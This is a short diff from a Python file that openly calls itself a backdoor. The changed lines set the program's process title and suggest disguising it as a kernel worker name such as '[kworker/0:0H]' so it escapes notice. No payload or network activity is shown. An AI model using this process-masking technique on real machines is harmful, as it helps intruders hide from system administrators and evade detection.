@@ -9,8 +9,7 @@ import platform
 import setproctitle
 
 # Mask the backdoor process name
-# Recommend something like "[kworker/0:0H]" or
-# "/usr/bin/systemd/systemd-login"
+# Recommend something like "[kworker/0:0H]"
 title = "backdoor"   #replace "backdoor" with your custom process title
 setproctitle.setproctitle(title)
 
